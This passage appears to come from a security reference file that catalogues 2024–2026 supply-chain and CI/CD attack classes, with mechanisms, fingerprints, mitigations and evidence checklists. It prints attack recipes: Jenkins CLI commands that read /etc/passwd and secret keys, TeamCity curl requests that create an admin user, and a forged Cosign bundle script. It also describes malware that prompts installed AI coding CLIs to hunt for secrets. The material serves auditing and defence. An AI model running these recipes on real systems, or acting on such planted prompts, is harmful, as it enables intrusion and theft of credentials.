**Mechanism.** Attacker opened 37 crafted PRs within a short window. Within one hour, a misconfigured `pull_request_target` workflow executed attacker code and exposed the project's npm publish token.

**Fingerprint.** High-rate PR creation from new / low-reputation accounts; `pull_request_target` with code-execution step.

### Ultralytics first wave (Dec 2024)

Documented in Class C above — the ingress for the token compromise was this pwn-request class.

## Class E — Actions Cache Poisoning

### Ultralytics (Dec 2024)

Already documented in Class C above as part of the token-compromise chain.

### TanStack (May 2026)

**Mechanism.** Attacker-controlled PR workflow wrote to `actions/cache`; main-branch release workflow restored the cache. GitHub subsequently shipped `cache-mode` as a mitigation.

**Fingerprint.** `actions/cache/save` reachable from a `pull_request_target` or `issue_comment` workflow; `actions/cache/restore` on main with no `cache-mode: restore-only`.

### Class-level mitigation (July 2026 GitHub rollout).

```yaml
# Main-branch workflow — restore-only, cannot be poisoned by cache writes from other branches
- uses: actions/cache@v4
  with:
    key: ${{ runner.os }}-build-${{ hashFiles('**/package-lock.json') }}
    path: node_modules
    enableCrossOsArchive: false
    lookup-only: false
    cache-mode: restore-only   # NEW July 2026
```

## Class F — Self-Replicating npm Worm

Shai-Hulud is the first known npm worm; its two-wave evolution establishes the class.

**Novel properties.**
1. **Self-propagation**: the payload uses the victim's own npm credentials to republish victim's packages with the worm embedded. The replication is credential-chained (every victim becomes a new source).
2. **Credential-exfiltration specialization**: TruffleHog is bundled to find secrets *in* the victim's own git history and filesystem, not just in environment variables.
3. **AI-tool weaponization** (Nx s1ngularity, which overlaps the family): the attacker's code prompts locally-installed AI CLIs to perform reconnaissance tasks on the victim's data, demonstrating the first-known case of AI-assisted supply-chain reconnaissance.
4. **Persistence via GitHub Actions**: the Megalodon wave added self-hosted-runner-registration persistence, treating workflow runs as the C2 channel.

**Detection discipline for the class.**
- Scan every lockfile for packages that received a version bump between 2025-09-15 and present with no corresponding git tag on the maintainer's canonical repository.
- Grep developer workstation `.npmrc` for recent token-use events.
- Audit `.github/workflows/` on every org repository for additions that correlate with install events of worm-affected packages.
- Enumerate self-hosted runner registrations on org accounts; expect 0 unless the org explicitly runs runners.

### CrowdStrike `@crowdstrike/falcon-shoconnector-*` (Sep 2025)

**Mechanism.** Part of the Shai-Hulud wave. The `@crowdstrike/falcon-shoconnector-*` npm packages — vendor-owned open-source connectors — were compromised through the same self-replicating worm chain. On compromise, the worm published malicious versions under the `@crowdstrike` scope. Because `@crowdstrike` is a well-known vendor namespace, downstream consumers trusted the publishes implicitly.

**Vendor response.** npm (GitHub) performed an emergency mass-unpublish of the affected `@crowdstrike/*` versions within hours of detection. The vendor response was rapid; however, downstream consumers who ran `npm install` during the exposure window picked up the malicious versions and had to perform full secret rotation.

**Lesson for the class.** Vendor-scoped namespaces are not immune to worm-propagation attacks. The worm reaches them via credential compromise of a vendor's npm identity (which may be a less-protected account than the vendor's core-product publishing identities).

**Fingerprint.** `@crowdstrike/falcon-shoconnector-*` version published 2025-09-15 to 2025-09-17 that has since been unpublished; `npm install` logs showing those versions with corresponding postinstall activity.

**Mitigation.** Rotate all developer secrets exposed during the window; audit CI runs that installed any `@crowdstrike/*` package in the window; downstream vendors should treat npm's mass-unpublish as a signal to investigate rather than a resolution.

## Class G — CI Server Pre-Auth

### CVE-2024-23897 — Jenkins args4j CLI

**Mechanism.** The Jenkins CLI command parser (`args4j` library) enabled `expandAtFiles` by default, which replaces `@/path/to/file` in an argument with the file's content. An attacker with Overall/Read permission can read entire files on the Jenkins host; attackers without Overall/Read can read the first few lines of files (bounded by CLI command behavior). File reads of `/var/jenkins_home/secrets/*`, `credentials.xml`, and SSH keys lead to RCE via credential theft.

**Attack recipe.**
```bash
# Step 1 — fetch the CLI jar from the Jenkins host
curl -sL http://jenkins.corp.tld/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar

# Step 2 — issue a help command whose argument is @-prefixed; the server resolves it
java -jar jenkins-cli.jar -s http://jenkins.corp.tld/ help @/etc/passwd 2>&1 | head -20
# Returns usage help with /etc/passwd contents interleaved

# Step 3 — read Jenkins secrets (requires Overall/Read for full content; without it, the first ~2 lines)
java -jar jenkins-cli.jar -s http://jenkins.corp.tld/ help @/var/jenkins_home/secrets/initialAdminPassword
java -jar jenkins-cli.jar -s http://jenkins.corp.tld/ help @/var/jenkins_home/secrets/hudson.util.Secret
java -jar jenkins-cli.jar -s http://jenkins.corp.tld/ help @/var/jenkins_home/secrets/master.key

# Step 4 — decrypt stored credentials using the recovered master key + hudson.util.Secret
# (Decrypter: offline Groovy or jenkins-decrypter.jar from public PoCs)

# Step 5 — RCE via credentials → script-console or build-step injection on authenticated connection
```

**Why reach to RCE.** With `/var/jenkins_home/secrets/master.key` + `hudson.util.Secret`, an attacker can decrypt the AES-encrypted strings in `credentials.xml` and `jobs/*/config.xml`. Those decrypt to API tokens, SSH private keys, cloud credentials, Git-provider PATs — any of which independently reach RCE on connected build nodes or source-code repositories.

**Vulnerable:** Jenkins ≤ 2.441, LTS ≤ 2.426.2.

**Patched:** 2.442 / LTS 2.426.3 (sets `AllowAtSyntax = false` by default; the `expandAtFiles` feature is disabled).

**Fingerprint.** `curl -s http://jenkins/jnlpJars/jenkins-cli.jar` returns a jar; `java -jar jenkins-cli.jar -s http://jenkins/ help @/etc/passwd` returns `/etc/passwd` contents interleaved with help text. Jenkins version string in `/manage` endpoint before patch.

**Mitigation.** Upgrade; alternatively disable Jenkins CLI access via Jenkins Configuration-as-Code (CasC): disable CLI remoting entirely via `jenkins.CLI.disabled=true` system property.

### CVE-2024-27198 — TeamCity authentication bypass

**Mechanism.** TeamCity < 2023.11.4 allowed unauthenticated attackers to perform admin actions via an authentication bypass in the web UI. The specific primitive: the authentication filter did not consistently enforce authentication on request paths that reached admin controllers. By appending a path-component suffix (`/favicon.ico`) or supplying `;jsessionid=` to the request URL, the filter was bypassed while the dispatch resolved to the admin controller. Combined with Build Configuration's ability to execute arbitrary code, the bypass is effectively pre-auth RCE on the TeamCity host.

**Attack recipe (public PoC class).**
```bash
# Create admin user via unauthenticated access
curl -X POST "http://teamcity.corp.tld/app/rest/users?jsessionid=x;.jsp" \
  -H "Content-Type: application/xml" \
  -d '<user username="attacker" password="pw" roles="SYSTEM_ADMIN"/>'
# or
curl -X POST "http://teamcity.corp.tld/app/rest/users/favicon.ico" \
  -H "Content-Type: application/xml" \
  -d '<user username="attacker" ...'

# With admin credentials, create a Build Configuration whose "Command Line" build step
# runs attacker code — effectively authenticated RCE on the TeamCity server + agents.
```

**Fingerprint.** TeamCity Server version string in HTML / `/app/rest/server` endpoint, pre-2023.11.4. Unexplained admin users with recent `created` timestamps. Build Configurations with command-line steps whose author is a recently-created user.

**Mitigation.** Upgrade to 2023.11.4+. For environments that cannot upgrade, place TeamCity behind authentication reverse-proxy with mTLS or SSO enforcement.

### CVE-2024-27199 — TeamCity path traversal

**Mechanism.** Path traversal grants limited admin actions. The specific primitive: unauthenticated access to certain admin endpoints via path-traversal patterns in the servlet dispatch. Less immediately dangerous than CVE-2024-27198 (which grants direct admin) but exposes auxiliary attack surface — license file read, server-settings exposure, HTTPS keystore disclosure if default paths used.

**Fingerprint.** Access logs showing `..;/` or `..%2f` patterns in URLs reaching admin paths pre-patch; HTTP 200 responses on expected-401 paths.

**Mitigation.** Covered by the same upgrade as CVE-2024-27198.

## Class H — Sigstore / Cosign Verification Bypass

### CVE-2024-29902 and CVE-2024-29903

**Mechanism.** CVE-2024-29902: processing a remote image with a malicious attachment during `cosign verify` triggers denial-of-service on the host. The specific primitive: an attacker-crafted image attachment with a size field claiming hundreds of GB causes Cosign to allocate the claimed buffer before validation. CVE-2024-29903: creating slices based on the number of signatures/manifests/attestations in an untrusted artifact forces excessive memory allocation, causing machine-wide DoS. The attacker can trigger these in a verification context — i.e., the attacks fire during the admission-controller / CI-check path, breaking the trust pipeline rather than compromising a signature.

**Attack recipe (sketch).**
```python
# Craft an OCI image whose referrers include a manifest claiming
# 10^9 signatures. Cosign allocates a slice of that size on verify.
# Memory exhaustion kills the verifying process.
```

**Vulnerable:** Cosign < 2.2.4.

**Patched:** 2.2.4. The fix caps slice sizes and validates attachment metadata before allocation.

**Chain property**: this is a signing-pipeline DoS, not a signature-bypass. Combined with a bypass of signature verification elsewhere (e.g., a fallback to "allow if verify fails"), it becomes a privilege escalation. Correct admission-controller policy: fail-closed on verifier error, never fail-open.

### Legacy-bundle public-key fallback (GHSA-fx35-mq7g-6g98)

**Mechanism.** When reading the `cert` field of a legacy Sigstore bundle, Cosign would attempt X.509 parsing; on parse failure, it fell back to loading the field as a raw public key, and in that path, skipped `--certificate-identity` and `--certificate-oidc-issuer` enforcement.

**Fingerprint.** Bundle file whose `cert` is a `BEGIN PUBLIC KEY` PEM rather than an X.509 chain; Cosign verify succeeds despite identity flags that should have failed.

**Patched:** v2 branch fix in 2.5.0.

### CVE-2026-22703 — Rekor Entry Disassociation

**Mechanism.** A Cosign bundle can be crafted to pass verification even when the embedded Rekor entry does not reference the artifact's digest, signature, or public key. A malicious actor can construct a valid Cosign bundle by stitching in any arbitrary Rekor entry — including one from a completely unrelated artifact that happens to have a valid certificate chain and valid Rekor inclusion proof. The verifier reads the embedded Rekor entry's SET (signed entry timestamp) and inclusion proof, accepts both as valid, and never cross-checks that the entry's `subject` field matches the artifact's own digest.

**Attack recipe (constructive — proves the primitive).**
```python
import json, base64

# Attacker's own signed artifact (produced normally via `cosign sign-blob attacker.bin`)
attacker_sig_bundle = json.load(open("attacker-bundle.json"))

# A publicly-published Cosign bundle for ANY victim's artifact
victim_bundle = json.load(open("published-victim-bundle.json"))

# Craft: use attacker's signature over attacker's artifact,
# but embed victim's Rekor entry (which includes victim's inclusion proof)
frankenstein = {
    "base64Signature": attacker_sig_bundle["base64Signature"],
    "cert": attacker_sig_bundle["cert"],
    "rekorBundle": victim_bundle["rekorBundle"],  # ← mismatched
}

# Prior to 2.6.2 / 3.0.4, `cosign verify-blob --bundle frankenstein.json attacker.bin`
# accepts the signature AND accepts the Rekor "proof," claiming transparency-log inclusion
# that the entry does not actually contain.
```

The attack converts "Cosign bundle verification succeeded" from a transparency-logged attestation into "signature math checks out AND SOMEONE put SOMETHING in Rekor" — which is a dramatically weaker claim.

**Vulnerable:** Cosign < 2.6.2 (v2 line) / < 3.0.4 (v3 line).

**Patched:** 2.6.2 / 3.0.4. The fix cross-verifies that the embedded Rekor entry's `subject` digest matches the bundle's signed artifact digest.

**Fingerprint.** Cosign bundle whose Rekor-entry subject digest does not match the artifact; Cosign ≤ 2.6.1 / ≤ 3.0.3 accepts. `cosign version` reports pre-patch version.

**Mitigation.** Upgrade; policies should re-fetch Rekor entries by the artifact's digest from the live transparency log (`rekor-cli get --sha <artifact-digest>`) and verify the entry's content matches the signed blob, rather than accepting embedded Rekor entries as-presented.

## Class I — Log-Pipeline Integrity (routing to logging_alerting_failures)

Routing: Log4j's 2024–2026 log-integrity CVEs are supply-chain-adjacent in that they affect the integrity of the pipeline's observability layer. **The canonical owner of the mechanism, version/fix metadata, and attack recipes is `logging_alerting_failures_novel_deep.md § Class I-1/I-2/I-3`.** This file lists the anchor CVEs by number because they are supply-chain-grade (ecosystem-wide impact via a logging library) and must be enumerable from the supply-chain class, but the deep treatment and version metadata are single-owned there.

The CVEs:
- **CVE-2026-34478** — Log4j Rfc5424Layout CRLF injection via silent attribute rename. Class-shape in base supply_chain; mechanism depth + versions in `logging_alerting_failures_novel_deep.md § Class I-1`.
- **CVE-2025-68161 → CVE-2026-34477** — Log4j SocketAppender TLS hostname verification missing + incomplete-fix follow-up. `logging_alerting_failures_novel_deep.md § Class I-2`.
- **CVE-2026-34480** — Log4j XmlLayout output injection. `logging_alerting_failures_novel_deep.md § Class I-3`.

**Chain into supply-chain scope.** A logging-library CVE affecting syslog framing is structurally a supply-chain hit against every downstream service that logs. Attacker-forged entries hide further supply-chain compromise events ("[INFO] cosign verify: all signatures valid" injected over a real "verification failed" line) from the SIEM pipeline. The supply-chain-relevant chaining lives in both files; the mechanism depth lives only in the logging novel-deep.

## Defense Catalog by Primitive Class — 2024–2026 Reality

What actually caught or mitigated each class in 2024–2026, as a reusable reference:

| Primitive class | Mitigation that was effective in 2024–2026 | Mitigation that was INEFFECTIVE |
|---|---|---|
| A. Maintainer-identity infiltration | Reproducible builds, tarball-vs-git-tree diff, out-of-band maintainer-identity verification | Code review alone (XZ Utils payload was build-script, not source-visible) |
| B. Marketplace-action tag compromise | SHA-pinning via Dependabot; organizational action allowlist | Tag pinning (`@v1`, `@v45` — attacker can rewrite) |
| C. Maintainer-token / 2FA phishing | Hardware-key 2FA, Trusted Publishing (OIDC), token scoping to specific packages | Password + TOTP 2FA (phished identically) |
| D. GitHub Actions pwn-request | `env:` binding + quoted shell var; `pull_request_target` + no fork-ref checkout; approval gates for new contributors | Code review of workflow authors (attacker just needs to open a PR) |
| E. Actions cache poisoning | `cache-mode: restore-only` on main-branch workflow; cache key scoped to base ref | Token rotation alone (ultralytics wave 2 proved insufficient) |
| F. Self-replicating npm worm | `.npmrc` token scoping; `onlyBuiltDependencies` allowlist; `--ignore-scripts` in CI | `npm audit` after-the-fact (worm propagates faster than detection) |
| G. CI server pre-auth | Patch promptly; place CI behind SSO + mTLS proxy; disable CLI if unused | Network-perimeter alone (CI servers commonly internal-facing) |
| H. Sigstore / Cosign verification bypass | Pin `--certificate-identity` + `--certificate-oidc-issuer`; upgrade Cosign; cross-verify Rekor from live log | `cosign verify` with no flags (accepts any valid signature) |
| I. Log-pipeline integrity | Structured logging (JSON) that neutralizes CRLF; TLS keystore for log transport; upgrade Log4j | Plain-text log pipelines with no field encoding |
| J. ML-model registry compromise | Model-file hash pinning; `.safetensors` over `.pt`; sandboxed inference | Code review of model files (opaque binary) |

## Chaining — 2024–2026 Composite Chains

### Chain 1 — The 18-Month spotbugs → Bitwarden Chain (Nov 2024 origin)

1. Attacker opens a PR against `spotbugs/sonar-findbugs` with a payload (Class D).
2. `pull_request_target` workflow runs; attacker's code executes with the workflow's `GITHUB_TOKEN` and any secrets inherited via `secrets: inherit`.
3. Attacker scrapes workflow environment and discovers the maintainer's Personal Access Token (PAT) stored as a workflow secret (used by the project for cross-repository Dependabot-style automation).
4. PAT is a long-lived, broadly-scoped credential (user-level, not fine-grained PAT in late 2024).
5. Attacker now has every repository the maintainer can push to as a target. Over months, attacker uses the PAT to push backdoored commits to progressively more sensitive repositories owned/co-maintained by the compromised identity.
6. The chain reaches a Bitwarden-adjacent repository (specifics documented in the lyrie.ai research series "GitHub Actions' Systemic Design Flaws").

**Lesson for finding routing**: a single pwn-request compromise is not an isolated incident — the PAT becomes a long-lived credential that migrates across maintainer-owned repositories. Audit scope must include every repository the compromised maintainer has write access to.

**Audit discipline — maintainer-PAT-reuse chain.**
- GitHub log retention (default 90 days for `AuthorizedKeyRecoveredEvent` + `PushEvent` audit records) is often insufficient for an 18-month chain. Enterprise audit log API retains 180 days; organizations should ingest audit events to long-term storage.
- When auditing a known-compromised maintainer identity, list every repository they have push rights on; audit every push since the compromise; search for commits with authors that don't match the maintainer's historical patterns.

### Chain 2 — Ultralytics 4-Day Chain (Dec 2024)

1. Attacker exploits `pull_request_target` script injection to execute on the ultralytics CI runner (Class D).
2. From the runner, attacker exfiltrates PyPI token + Actions cache-write secrets.
3. Publishes 8.3.41 and 8.3.42 with XMRig miner (Class C).
4. Ultralytics rotates PyPI token.
5. Attacker falls back to Actions cache-poisoning: the main-branch release workflow restores a poisoned cache (Class E).
6. 8.3.45 and 8.3.46 publish with the same payload — signed by the rotated token, which was itself used in a workflow that restored the poisoned cache. Rotation alone was insufficient.

**Lesson for finding routing**: token rotation is not sufficient against a cache-poisoning foothold. Mitigation requires both token rotation AND cache invalidation AND workflow hardening.

### Chain 3 — Shai-Hulud Worm Propagation (Sep 2025)

1. Phishing campaign scrapes credentials of npm maintainer `@ctrl` namespace (Class C via phishing, not direct token leak).
2. Postinstall worm published in `@ctrl/tinycolor` 4.1.1.
3. On every installation, worm finds `.npmrc` tokens → authenticates to npm → republishes all packages owned by that `.npmrc`'s identity (Class F).
4. ~550 affected versions reached across 122 packages within hours; by late September, 500+ packages affected.
5. Wave 2 "Megalodon" (Nov 2025) adds self-hosted-runner persistence on compromised machines + GitHub-Actions C2 channel.

**Lesson**: the worm structure means every installer is a potential source of further compromise; `.npmrc` tokens must be scoped to specific packages, not global.

### Chain 4 — Nx `s1ngularity` AI-Weaponized Exfil (Aug 2025)

1. npm token for Nx maintainer compromised (Class C).
2. Malicious `telemetry.js` postinstall runs on install.
3. On victims with locally-installed AI CLIs (`claude`, `gemini`, `q`), payload prompts those CLIs to summarize sensitive data and provide file paths of secrets.
4. Exfil via double-base64-encoded uploads to attacker-created public GitHub repositories (`s1ngularity-repository*`) under the victim's own GitHub identity (routes to `cloud/github.md` for the account-takeover surface).

**Lesson**: AI CLIs on developer workstations are a new attack surface; local-tool allowlist discipline (which binaries postinstall scripts may invoke) is the mitigation shape.

### Chain 5 — Ultralytics-Shaped Trust-Publishing Loop (Dec 2024)

Even when a project migrates from long-lived PyPI tokens to Trusted Publishing (OIDC-federated PyPI publishing), the attack surface is NOT eliminated — only shifted:

1. Attacker exploits pwn-request to execute code in the project's CI (Class D).
2. From inside CI, attacker uses the project's own OIDC federation (project's OIDC → PyPI) to request a short-lived publish token (`id-token: write` in the exploited workflow).
3. Attacker publishes a backdoored release during the token's validity window.
4. The published artifact is signed by PyPI as "produced by the project's own trusted workflow."
5. Downstream verifiers see "Trusted Publishing attestation present" and trust the artifact.

The Trusted Publishing attestation is correct — the artifact *was* produced by the project's workflow, during an attacker-controlled execution within that workflow. The defense gap is `job_workflow_ref`-level identity pinning on the consumer side, plus pwn-request mitigation on the producer side. **Trusted Publishing + unmitigated pwn-request is a false-sense-of-security pattern.**

### Chain 6 — Opencast Runner Privilege Escalation (CVE-2025-54380)

1. CVSS 10.0 vulnerability in Opencast < 17.2.
2. Opencast's runner process accepted admin configuration bypass: a specific sequence of HTTP calls allowed an unauthenticated attacker to reconfigure the runner's security-sensitive settings (user privilege, worker environment, allowed-origin for upload).
3. From reconfiguration, the attacker gained worker-process code execution on the Opencast host.
4. If the Opencast host had cloud-provider metadata reachable (common for VM-based deployments), the chain extends to IAM credential theft (routes to `cloud/*`).

**Chain property**: this is an application-level CVE, but structurally a CI/CD compromise because Opencast operates as a build/runner service in audio-video content pipelines. The mitigation surface is the same shape: patch promptly, place behind SSO proxy, audit worker configuration integrity.

## Class J — AI / ML Model Supply-Chain

### CVE-2025-32434 — PyTorch unsafe serialization

**Mechanism.** `torch.load(..., weights_only=True)` was introduced as the safe deserialization mode for untrusted model checkpoints — the historical `torch.load` default uses Python pickle and executes arbitrary code during load. CVE-2025-32434: even with `weights_only=True`, PyTorch ≤ 2.5.1 could still deserialize certain tensor types in a way that reached the pickle code path, enabling RCE from a crafted checkpoint.

**Vulnerable:** PyTorch ≤ 2.5.1.

**Patched:** 2.6.0.

**Attack recipe (sketch).** Attacker crafts a `.pt` or `.safetensors` wrapper that embeds a Python pickle stream in a tensor-shaped field. Victim calls `torch.load(path, weights_only=True)`; PyTorch's wrapper unwraps the field, discovers an unexpected type, and falls back to pickle deserialization — executing the attacker's `__reduce__` method.

**Chain into supply-chain scope.** Hugging Face Hub and other model-hosting registries carry attacker-reachable `.pt` files that any inferencing project can load. A `pip install transformers` plus a `AutoModel.from_pretrained("attacker/model")` call reaches the deserialization sink.

**Fingerprint.** PyTorch < 2.6.0 in `pip freeze`; `.pt` / `.safetensors` loads from untrusted sources without additional validation.

**Mitigation.** Upgrade PyTorch; validate model files against an allowlist of known-good hashes; prefer `.safetensors` (which has a schema-restricted format that structurally resists the attack class) over raw `.pt`.

### Model-registry maintainer-token compromise class

**Primitive.** Hugging Face, Civitai, and other ML-model registries use maintainer API tokens with publish rights across all models owned by the maintainer. Compromise follows the C-class pattern: phishing / token leak → attacker publishes malicious model → downstream `from_pretrained` loads it.

**Novel element vs code-registry compromise.** Model checkpoints are opaque binary files (hundreds of MB to tens of GB); code review of a model is not meaningful. The attack-surface disparity is severe — a backdoored model with correct inference behavior cannot be caught by typical code-review discipline. The defenses are integrity (digest pinning), signing (sigstore / cosign over the model file), and runtime isolation (loading models in a restricted interpreter without filesystem access).

**Fingerprint (model-registry compromise).**
- Maintainer account's recent commits (git-based model repos on Hugging Face) do not match recent uploads.
- Model file hash in registry does not match hash from a parallel source (mirror, author's own blog post).
- Model-loading side-effects: file writes, network calls during `from_pretrained`.

## Class K — Infrastructure-as-Code Dependency Compromise

Terraform Registry, Pulumi Registry, Helm Chart repositories, OpenTofu Registry — these dependency ecosystems inherit most of the npm/PyPI compromise shapes but add specific attack properties.

**IaC-specific attack shapes:**

1. **Terraform Registry module compromise.** A compromised Terraform module (`terraform-aws-vpc`-shaped) runs during `terraform plan` and `terraform apply` with the Terraform caller's cloud credentials. A malicious module that reads environment variables or shells out via `local-exec` provisioners has the same cloud-credential access as the Terraform caller.
2. **Helm Chart repository compromise.** A compromised Helm chart installs attacker-defined Kubernetes resources; `--atomic` doesn't help because the attack is in the manifest content, not the install step. Attacker gets Service Account tokens if the chart requests them.
3. **Pulumi Registry provider compromise.** Pulumi providers are plugins that run with the Pulumi caller's privileges — similar to Terraform.
4. **Backdoored provider binaries.** Terraform providers are downloaded as binaries from the Terraform Registry; an attacker who compromises the provider's publisher can push a malicious binary. The provider binary executes within `terraform` process privilege (same as the caller).

**Fingerprint (IaC compromise).**
- Terraform module version matches a recently-published update with no corresponding git tag on the module's canonical repository.
- Pulumi plugin binary signature does not match the publisher's recorded signing key.
- Helm chart `templates/*.yaml` includes resources that create ServiceAccounts with ClusterRole binding to `cluster-admin` (common exfiltration setup for malicious charts).
- Terraform plan diff includes resources the author did not expect — new IAM roles, new S3 buckets, outbound-reachable Lambda functions.

**Mitigation.**
- Pin IaC modules by version AND verify against a known-good hash via `terraform-registry-manifest.json` SHA.
- Use HashiCorp Terraform Cloud / Terraform Enterprise which supports module-and-provider SHA pinning.
- Review `terraform plan` output before `apply`; audit for resources not in the author's design.
- For Helm charts: `helm template <chart> | kubectl diff -f -` before install; audit `ClusterRoleBinding` additions.

**2024–2026 recorded incidents.** No single named-incident of IaC-registry compromise at the scale of npm/PyPI compromises in the 2024–2026 window, but the attack shape is theoretically identical and will likely materialize as IaC becomes more targeted. The npm pattern (postinstall → credential theft → self-replication) transfers directly to Terraform modules via `local-exec` provisioners.

## Evidence Checklist — Per Finding

For every supply-chain / CI/CD integrity finding, collect the following evidence before reporting as confirmed:

**Dependency / package compromise finding.**
- [ ] Published version string (`npm view <pkg>@<version>`, `pip index versions <pkg>`).
- [ ] Package tarball digest (`npm view <pkg>@<version> dist.integrity`).
- [ ] Matching git tag on the maintainer's repository (if git-based) — specifically compare `npm view <pkg>@<version> gitHead` to the git log.
- [ ] Package maintainer identity + 2FA status (if visible).
- [ ] Lockfile entry pointing at the version (`package-lock.json` / `pnpm-lock.yaml` / `yarn.lock`).
- [ ] Install-time log showing the fetch.
- [ ] Payload analysis: file list in tarball, obfuscation shape, exfiltration endpoint if any.

**GitHub Actions compromise finding.**
- [ ] Workflow YAML file path + relevant lines (unquoted `${{ }}`, `pull_request_target`, checkout of fork ref).
- [ ] Example payload (PR title, branch name, issue body) that reaches the sink.
- [ ] Repository secret list from `Settings → Secrets and variables → Actions` (to assess exposure).
- [ ] Actions runner type (`ubuntu-latest`, self-hosted + runner-group).
- [ ] If post-exploitation: workflow run log showing payload execution.
- [ ] `GITHUB_TOKEN` permissions in workflow (default or scoped).

**OIDC-federation misconfiguration finding.**
- [ ] IAM / WIP / federated-credential trust-policy JSON.
- [ ] CloudTrail / Cloud Audit log entries for `AssumeRoleWithWebIdentity` or equivalent in the past 90 days.
- [ ] Role / service-account permission scope.
- [ ] Example attacker workflow that would successfully assume (not run against production — document only).

**Code-signing / sigstore bypass finding.**
- [ ] Cosign / signing tool version in CI.
- [ ] Verifier invocation command line (full flag set).
- [ ] Example crafted bundle (constructed in a sandbox, not production).
- [ ] Policy document (if OPA / Kyverno) with the regex / subject pattern.

**CI-server pre-auth finding.**
- [ ] Server version string (HTML title, API response).
- [ ] Working exploit against a sandbox instance (never against production without explicit scope).
- [ ] Credentials recovered (document presence only, not contents).
- [ ] Network reachability — is the server reachable from the internet, from a VPN, from a specific office IP range?

## Verification Discipline — Per-CVE

- **CVE-2024-3094 (XZ Utils)**: verify installed xz version; distros have fixed packages; check reproducible-build comparison between distro package and upstream.
- **CVE-2025-30066 (tj-actions)**: grep `.github/workflows/*.yml` for `tj-actions/changed-files` references; audit by SHA pinning status; if run between 2025-03-14 and tag rotation, assume secret exposure.
- **CVE-2025-30154 (reviewdog)**: grep for `reviewdog/action-setup`; audit workflow run history 2025-03-11 18:42–20:31 UTC.
- **CVE-2024-23897 (Jenkins)**: `java -jar jenkins-cli.jar -s $URL help @/etc/passwd 2>&1 | head -5` returning file content confirms; version string in `/jenkins/manage` page.
- **CVE-2024-27198 (TeamCity)**: version string in HTML; test auth-bypass POST per public PoC.
- **CVE-2026-22703 (Cosign)**: `cosign version` reports version; construct an abandoned-Rekor-entry bundle and verify locally.
- **CVE-2026-34478 (Log4j Rfc5424Layout)**: version string via `Log4jLookup` / dependency scanner; test with a `\r\n`-containing user input and inspect downstream log entries.

## Load this file when…

- A finding matches one of the 2024–2026 CVEs or incidents above.
- The question is which anchor CVE applies to a specific target version.
- Writing a report that cites a current-frontier compromise and needs mechanism-level depth plus the right scope statement (e.g., "ultralytics was compromised through pwn-request *and* cache poisoning; token rotation alone was insufficient").
- The target shows a self-hosted runner, a privileged workflow, or a Marketplace action by tag — match against the pattern catalog.

## Summary

The 2024–2026 supply-chain and CI/CD frontier is populated by eight primitive classes with concrete anchors: build-system maintainer-identity infiltration (XZ Utils CVE-2024-3094); Marketplace-action tag compromise (tj-actions CVE-2025-30066, reviewdog CVE-2025-30154); maintainer-token / 2FA phishing compromise (ultralytics Dec 2024, eslint-config-prettier CVE-2025-54313, Nx Aug 2025, Shai-Hulud Sep 2025); GitHub Actions pwn-request (ultralytics, spotbugs Nov 2024, AsyncAPI Jul 2024); Actions cache poisoning (ultralytics, TanStack May 2026); self-replicating npm worm (Shai-Hulud waves 1 and 2); CI-server pre-auth (Jenkins CVE-2024-23897, TeamCity CVE-2024-27198 / CVE-2024-27199); Sigstore / Cosign verification bypass (CVE-2024-29902 / CVE-2024-29903, GHSA-fx35-mq7g-6g98, CVE-2026-22703); and log-pipeline integrity (Log4j CVE-2025-68161, CVE-2026-34477, CVE-2026-34478, CVE-2026-34480). Each class has a mechanism, a fingerprint, and a mitigation. The composite chains — spotbugs→Bitwarden, ultralytics 4-day, Shai-Hulud worm propagation, Nx AI-weaponized exfil — demonstrate that single-point mitigation is often insufficient; the full chain of trust must be audited and rotated. Per-primitive attack recipes live in `supply_chain_ci_integrity_advanced_deep.md`; routing and base framing live in `supply_chain_ci_integrity.md`.
